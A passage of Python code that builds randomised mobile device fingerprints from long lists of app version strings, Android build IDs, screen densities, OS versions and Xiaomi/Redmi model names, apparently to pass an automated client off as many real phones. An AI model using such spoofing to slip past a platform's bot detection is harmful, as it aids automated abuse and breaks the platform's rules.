'348.0.0.0.94', '348.0.0.0.87', '348.0.0.0.66', '348.0.0.0.49', '348.0.0.0.30', '348.0.0.0.18', '348.0.0.0.0', '347.0.0.16.237', '347.0.0.11.237', '347.0.0.5.237', '347.0.0.1.237', '347.0.0.0.221', '347.0.0.0.204', '347.0.0.0.188', '347.0.0.0.168', '347.0.0.0.151', '347.0.0.0.136', '347.0.0.0.103', '347.0.0.0.66', '347.0.0.0.51', '347.0.0.0.36', '347.0.0.0.16', '347.0.0.0.6', '346.0.0.25.119', '346.0.0.24.119', '346.0.0.23.119', '346.0.0.15.119', '346.0.0.6.119', '346.0.0.5.119', '346.0.0.1.119', '346.0.0.0.23', '346.0.0.0.19', '346.0.0.0.1', '345.0.0.22.118', '345.0.0.15.118', '345.0.0.8.118', '345.0.0.1.118', '345.0.0.0.103', '345.0.0.0.85', '345.0.0.0.34', '345.0.0.0.3', '344.0.0.28.116', '344.0.0.13.116', '344.0.0.5.116', '344.0.0.1.116', '344.0.0.0.98', '344.0.0.0.26', '344.0.0.0.24', '343.0.0.35.117', '343.0.0.29.117', '343.0.0.21.117', '343.0.0.13.117', '343.0.0.0.102', '343.0.0.0.85', '343.0.0.0.69', '343.0.0.0.46', '343.0.0.0.32', '343.0.0.0.18', '342.0.0.31.119', '342.0.0.21.119', '342.0.0.16.119', '342.0.0.11.119', '342.0.0.10.119', '342.0.0.1.118', '342.0.0.0.100', '342.0.0.0.89', '342.0.0.0.72', '342.0.0.0.47', '341.0.0.19.73', '341.0.0.12.73', '341.0.0.4.73', '341.0.0.0.57', '341.0.0.0.43', '341.0.0.0.22', '341.0.0.0.18', '341.0.0.0.1', '340.0.0.23.113', '340.0.0.15.113', '340.0.0.10.113', '340.0.0.5.113', '340.0.0.1.113', '340.0.0.0.94', '340.0.0.0.82', '340.0.0.0.70', '340.0.0.0.51', '340.0.0.0.34', '340.0.0.0.8', '340.0.0.0.2', '339.0.0.8.118', '339.0.0.3.118', '339.0.0.1.118', '339.0.0.0.104', '339.0.0.0.87', '339.0.0.0.67', '338.0.0.28.118', '338.0.0.19.118', '338.0.0.13.118', '338.0.0.8.118', '338.0.0.2.118', '338.0.0.0.84', '338.0.0.0.68', '338.0.0.0.51', '338.0.0.0.25', '338.0.0.0.19', '338.0.0.0.2', '337.0.0.30.118', '337.0.0.21.118', '337.0.0.14.118', '337.0.0.8.118', '337.0.0.7.118', '337.0.0.1.118', '337.0.0.0.102', '337.0.0.0.68', '337.0.0.0.51', '337.0.0.0.36', '337.0.0.0.6', '337.0.0.0.2', '336.0.0.13.117', '336.0.0.6.117', '336.0.0.1.117', '336.0.0.0.102', '336.0.0.0.85', '336.0.0.0.68', '336.0.0.0.52', '336.0.0.0.35', '336.0.0.0.15', '336.0.0.0.3', '335.0.0.21.118', '335.0.0.16.118', '335.0.0.13.118', '335.0.0.8.118', '335.0.0.7.118', '335.0.0.2.118', '335.0.0.0.101', '335.0.0.0.87', '335.0.0.0.69', '335.0.0.0.53', '335.0.0.0.35', '335.0.0.0.19', '334.0.0.28.119', '334.0.0.20.119', '334.0.0.13.119', '334.0.0.8.119', '334.0.0.1.119', '334.0.0.0.88', '334.0.0.0.24', '334.0.0.0.18', '333.0.0.22.119', '333.0.0.14.119', '333.0.0.9.119', '333.0.0.3.119', '333.0.0.0.104', '333.0.0.0.86', '333.0.0.0.72', '333.0.0.0.62', '333.0.0.0.42', '333.0.0.0.36', '333.0.0.0.19', '333.0.0.0.4', '332.0.0.20.111', '332.0.0.14.111', '332.0.0.8.111', '332.0.0.1.111', '332.0.0.0.96', '332.0.0.0.31', '332.0.0.0.17', '332.0.0.0.2', '331.0.0.25.117', '331.0.0.19.117', '331.0.0.13.117', '331.0.0.3.117', '331.0.0.0.85', '331.0.0.0.68', '331.0.0.0.52', '331.0.0.0.27', '331.0.0.0.6', '330.0.0.24.120', '330.0.0.19.120', '330.0.0.13.120', '330.0.0.7.120', '330.0.0.0.102', '330.0.0.0.87', '330.0.0.0.54', '330.0.0.0.38', '330.0.0.0.21', '329.0.0.19.120', '329.0.0.12.120', '329.0.0.7.120', '329.0.0.0.105', '329.0.0.0.87', '329.0.0.0.70', '329.0.0.0.55', '329.0.0.0.26', '329.0.0.0.20', '328.0.0.14.119', '328.0.0.7.119', '328.0.0.2.119', '328.0.0.1.119', '328.0.0.0.110', '328.0.0.0.89', '328.0.0.0.71', '328.0.0.0.52', '328.0.0.0.17', '328.0.0.0.2', '327.0.0.28.120', '327.0.0.24.120', '327.0.0.5.120', '327.0.0.2.120', '327.0.0.0.106', '327.0.0.0.88', '327.0.0.0.68', '327.0.0.0.52', '327.0.0.0.34', '327.0.0.0.1', '326.0.0.24.120', '326.0.0.13.120', '326.0.0.11.120', '326.0.0.7.120', '326.0.0.0.88', '326.0.0.0.72', '326.0.0.0.52', '326.0.0.0.19', '326.0.0.0.5', '325.0.0.25.170', '325.0.0.17.170', '325.0.0.10.170', '325.0.0.5.170', '325.0.0.0.142', '325.0.0.0.68', '325.0.0.0.44', '325.0.0.0.2', '324.0.0.45.120', '324.0.0.38.120', '324.0.0.24.120', '324.0.0.16.120', '324.0.0.11.120', '324.0.0.3.120', '324.0.0.0.101', '324.0.0.0.77', '324.0.0.0.70', '324.0.0.0.53', '324.0.0.0.37', '324.0.0.0.19', '324.0.0.0.2', '323.0.0.40.119', '323.0.0.32.119', '323.0.0.29.119', '323.0.0.19.119', '323.0.0.10.119', '323.0.0.2.119', '323.0.0.0.99', '323.0.0.0.87', '323.0.0.0.70', '323.0.0.0.53', '323.0.0.0.36', '323.0.0.0.20', '323.0.0.0.12', '322.0.0.30.121', '322.0.0.25.121', '322.0.0.15.121', '322.0.0.11.121', '322.0.0.4.121', '322.0.0.0.105', '322.0.0.0.88', '322.0.0.0.72', '322.0.0.0.55', '322.0.0.0.37', '322.0.0.0.19', '322.0.0.0.0', '321.0.0.29.119', '321.0.0.22.119', '321.0.0.15.119', '321.0.0.6.119', '321.0.0.0.104', '321.0.0.0.83', '321.0.0.0.67', '321.0.0.0.53', '321.0.0.0.36', '321.0.0.0.18', '320.0.0.24.118', '320.0.0.10.118', '320.0.0.4.118', '320.0.0.0.103', '320.0.0.0.86', '320.0.0.0.70', '320.0.0.0.44', '320.0.0.0.36', '320.0.0.0.19', '320.0.0.0.2', '319.0.0.38.120', '319.0.0.34.120', '319.0.0.24.120', '319.0.0.17.120', '319.0.0.11.120', '319.0.0.3.120', '319.0.0.0.104', '319.0.0.0.87', '319.0.0.0.70', '319.0.0.0.53', '319.0.0.0.33', '319.0.0.0.16', '319.0.0.0.0', '318.0.0.27.154', '318.0.0.23.154', '318.0.0.19.154', '318.0.0.14.154', '318.0.0.3.154', '318.0.0.0.133', '318.0.0.0.131', '318.0.0.0.123', '318.0.0.0.104', '318.0.0.0.87', '318.0.0.0.70', '318.0.0.0.47', '318.0.0.0.34', '318.0.0.0.10', '317.0.0.38.119', '317.0.0.34.119', '317.0.0.27.119', '317.0.0.17.119', '317.0.0.0.104', '317.0.0.0.87', '317.0.0.0.70', '317.0.0.0.52', '317.0.0.0.19', '316.0.0.43.116', '316.0.0.35.116', '316.0.0.29.116', '316.0.0.19.116', '316.0.0.11.116', '316.0.0.0.101', '316.0.0.0.85', '316.0.0.0.68', '316.0.0.0.50', '316.0.0.0.38', '316.0.0.0.13', '315.0.0.39.113', '315.0.0.31.113', '315.0.0.25.113', '315.0.0.17.113', '315.0.0.14.113', '315.0.0.8.113', '315.0.0.0.99', '315.0.0.0.73', '315.0.0.0.55', '315.0.0.0.40', '315.0.0.0.15', '314.0.0.35.119', '314.0.0.28.119', '314.0.0.19.119', '301.0.0.0.167', '301.0.0.0.139', '300.0.0.44.129', '300.0.0.43.129', '301.0.0.0.123', '301.0.0.0.105', '301.0.0.0.80', '300.0.0.34.129', '301.0.0.0.54', '300.0.0.21.129', '300.0.0.15.129', '300.0.0.0.110', '299.0.0.39.236', '300.0.0.0.70', '299.0.0.30.236', '300.0.0.0.52', '299.0.0.14.236', '299.0.0.12.236', '299.0.0.0.219', '299.0.0.0.186', '299.0.0.0.169', '299.0.0.0.149', '299.0.0.0.134', '299.0.0.0.68', '299.0.0.0.48', '299.0.0.0.34', '298.0.0.40.116', '298.0.0.39.116', '298.0.0.26.116', '298.0.0.17.116', '298.0.0.10.116', '298.0.0.6.116', '298.0.0.2.116', '297.0.0.27.116', '298.0.0.0.91', '297.0.0.17.116', '298.0.0.0.37', '297.0.0.12.116', '298.0.0.0.31', '297.0.0.11.116', '297.0.0.1.116', '296.0.0.39.119', '297.0.0.0.93', '296.0.0.36.119', '297.0.0.0.71', '297.0.0.0.62', '296.0.0.25.119', '297.0.0.0.47', '296.0.0.20.119', '297.0.0.0.35', '296.0.0.15.119', '296.0.0.1.119', '296.0.0.0.79', '295.0.0.30.119', '295.0.0.27.119', '295.0.0.26.119', '296.0.0.0.46', '296.0.0.0.40', '295.0.0.19.119', '295.0.0.12.119', '296.0.0.0.12', '295.0.0.9.119', '296.0.0.0.3', '294.0.0.35.118', '295.0.0.0.74', '294.0.0.16.118', '295.0.0.0.37', '294.0.0.9.118', '295.0.0.0.24', '295.0.0.0.19', '294.0.0.6.118', '295.0.0.0.3', '294.0.0.0.112', '294.0.0.0.104', '294.0.0.0.84', '293.0.0.35.120', '294.0.0.0.71', '294.0.0.0.44', '293.0.0.28.120', '293.0.0.20.120', '293.0.0.13.120', '292.0.0.45.123', '292.0.0.39.123', '293.0.0.0.69', '292.0.0.35.123', '293.0.0.0.51', '293.0.0.0.48', '292.0.0.27.123', '293.0.0.0.33', '292.0.0.16.123', '293.0.0.0.22', '292.0.0.0.114', '291.0.0.39.120', '292.0.0.0.88', '291.0.0.34.120', '291.0.0.30.120', '292.0.0.0.53', '291.0.0.21.120', '292.0.0.0.41', '291.0.0.17.120', '292.0.0.0.17', '291.0.0.0.107', '291.0.0.0.67', '290.0.0.37.121', '291.0.0.0.51', '290.0.0.22.121', '290.0.0.0.109', '289.0.0.35.121', '290.0.0.0.68', '290.0.0.0.49', '289.0.0.20.121', '290.0.0.0.29', '290.0.0.0.23', '290.0.0.0.12', '288.0.0.35.123', '289.0.0.0.81', '289.0.0.0.64', '288.0.0.29.123', '289.0.0.0.44', '288.0.0.16.123', '289.0.0.0.31', '288.0.0.9.123', '288.0.0.0.116', '288.0.0.0.47', '288.0.0.0.36', '288.0.0.0.16', '287.0.0.46.119', '287.0.0.37.119', '287.0.0.31.119', '287.0.0.21.119', '287.0.0.15.119', '287.0.0.7.119', '287.0.0.0.115', '286.0.0.42.112', '287.0.0.0.87', '286.0.0.38.112', '287.0.0.0.63', '286.0.0.28.112', '286.0.0.24.112', '287.0.0.0.20', '286.0.0.4.112', '286.0.0.0.106', '285.0.0.30.120', '286.0.0.0.46', '285.0.0.18.120', '286.0.0.0.20', '285.0.0.12.120', '285.0.0.8.120', '285.0.0.0.113', '285.0.0.0.52', '285.0.0.0.35', '284.0.0.49.107', '284.0.0.36.107', '284.0.0.19.107', '284.0.0.13.107', '284.0.0.3.107', '284.0.0.0.75', '283.0.0.28.121', '283.0.0.23.121', '284.0.0.0.54', '283.0.0.20.121', '284.0.0.0.42', '283.0.0.16.121', '283.0.0.10.121', '284.0.0.0.15', '283.0.0.3.121', '283.0.0.0.96', '282.0.0.33.117', '283.0.0.0.67', '282.0.0.25.117', '283.0.0.0.50', '282.0.0.18.117', '283.0.0.0.32', '282.0.0.12.117', '282.0.0.0.81', '281.0.0.31.124', '282.0.0.0.36', '281.0.0.26.124', '281.0.0.11.124', '281.0.0.4.124', '281.0.0.0.105', '280.0.0.37.122', '281.0.0.0.94', '280.0.0.34.122', '281.0.0.0.72', '280.0.0.26.122', '281.0.0.0.50', '280.0.0.17.122', '280.0.0.13.122', '281.0.0.0.18', '280.0.0.0.100', '279.0.0.38.120', '280.0.0.0.85', '279.0.0.32.120', '279.0.0.27.120', '280.0.0.0.49', '279.0.0.19.120', '280.0.0.0.41', '280.0.0.0.34', '279.0.0.13.120', '279.0.0.4.120', '279.0.0.0.83', '279.0.0.0.69', '278.0.0.39.119', '278.0.0.35.119', '279.0.0.0.38', '278.0.0.14.119', '279.0.0.0.17', '278.0.0.4.119', '279.0.0.0.0', '278.0.0.0.113', '277.0.0.37.126', '278.0.0.0.85', '278.0.0.0.71', '277.0.0.32.126', '278.0.0.0.64', '277.0.0.28.126', '278.0.0.0.48', '277.0.0.19.126', '278.0.0.0.29', '277.0.0.10.126', '277.0.0.0.121', '276.0.0.42.127', '277.0.0.0.90', '276.0.0.34.127', '277.0.0.0.73', '276.0.0.28.127', '277.0.0.0.51', '276.0.0.20.127', '276.0.0.12.127', '276.0.0.9.127', '276.0.0.0.97', '275.0.0.40.127', '276.0.0.0.64', '276.0.0.0.50', '275.0.0.30.127', '275.0.0.24.127', '275.0.0.19.127', '275.0.0.11.127', '276.0.0.0.17', '275.0.0.6.127', '275.0.0.0.112', '275.0.0.0.111', '274.0.0.36.119', '274.0.0.30.119', '275.0.0.0.54', '274.0.0.22.119', '275.0.0.0.38', '274.0.0.11.119', '275.0.0.0.21', '274.0.0.7.119', '274.0.0.0.86', '274.0.0.0.64', '274.0.0.0.29', '273.0.0.28.123', '273.0.0.18.123', '273.0.0.3.122', '273.0.0.0.87', '272.0.0.38.125', '272.0.0.32.125', '273.0.0.0.46', '272.0.0.19.125', '273.0.0.0.35', '272.0.0.13.125', '273.0.0.0.18', '272.0.0.6.125', '272.0.0.0.109', '271.0.0.49.109', '272.0.0.0.92', '271.0.0.42.109', '272.0.0.0.73', '271.0.0.33.109', '272.0.0.0.56', '271.0.0.24.109', '272.0.0.0.36', '271.0.0.13.109', '272.0.0.0.19', '271.0.0.6.109', '271.0.0.0.76', '271.0.0.0.59', '271.0.0.0.48', '270.0.0.38.127', '270.0.0.31.127', '270.0.0.23.127', '271.0.0.0.34', '270.0.0.14.127', '271.0.0.0.22', '270.0.0.9.127', '271.0.0.0.15', '270.0.0.0.99', '269.0.0.38.127', '270.0.0.0.73', '269.0.0.28.127', '269.0.0.21.127', '270.0.0.0.38', '269.0.0.15.127', '269.0.0.0.97', '268.0.0.42.121', '269.0.0.0.66', '268.0.0.26.121', '269.0.0.0.60', '269.0.0.0.30', '268.0.0.7.121', '268.0.0.4.121', '268.0.0.0.121', '268.0.0.0.48', '267.0.0.39.120', '267.0.0.29.120', '267.0.0.24.120', '268.0.0.0.40', '267.0.0.14.120', '268.0.0.0.31', '267.0.0.7.120', '268.0.0.0.3', '267.0.0.2.120', '267.0.0.0.91', '266.0.0.47.124', '266.0.0.38.124', '267.0.0.0.63', '266.0.0.28.124', '267.0.0.0.34', '266.0.0.14.124', '267.0.0.0.0', '266.0.0.0.103', '266.0.0.0.89', '266.0.0.0.77', '266.0.0.0.66', '266.0.0.0.34', '266.0.0.0.31', '266.0.0.0.3', '265.0.0.53.103', '265.0.0.49.103', '265.0.0.42.103', '265.0.0.29.103', '265.0.0.19.103', '265.0.0.12.103', '265.0.0.6.103', '264.0.0.43.111', '265.0.0.0.77', '264.0.0.39.111', '265.0.0.0.64', '264.0.0.34.111', '265.0.0.0.47', '264.0.0.28.111', '265.0.0.0.45', '265.0.0.0.30', '264.0.0.21.111', '265.0.0.0.15', '264.0.0.14.111', '264.0.0.0.129', '264.0.0.6.111', '264.0.0.0.105', '264.0.0.0.61', '264.0.0.0.40', '264.0.0.0.26', '264.0.0.0.7', '263.0.0.41.121', '263.0.0.31.121', '263.0.0.25.121', '263.0.0.11.121', '263.0.0.4.121', '263.0.0.0.84', '262.0.0.29.117', '263.0.0.0.70', '262.0.0.25.117', '262.0.0.19.117', '263.0.0.0.30', '262.0.0.11.117', '262.0.0.5.117'])
            self.android_build = random.choice([
                f'RP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
                f'SP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
            ])
            self.density = random.choice(['density=2.0,width=720,height=1384', 'density=2.0,width=720,height=1412', 'density=4.0,width=1440,height=2560', 'density=3.0,width=1080,height=1920', 'density=2.0,width=720,height=1456', 'density=3.0,width=1080,height=1920', 'density=1.5,width=540,height=960', 'density=1.5,width=540,height=888', 'density=3.0,width=1080,height=1776', 'density=1.5,width=480,height=800', 'density=1.3312501,width=1280,height=800', 'density=2.0,width=720,height=1184'])
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            self.arm64_v7a = random.choice(['arm64-v8a:', 'armeabi-v7a:armeabi'])
            if "Xiaomi" in str(self.device):
                self.android_model = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 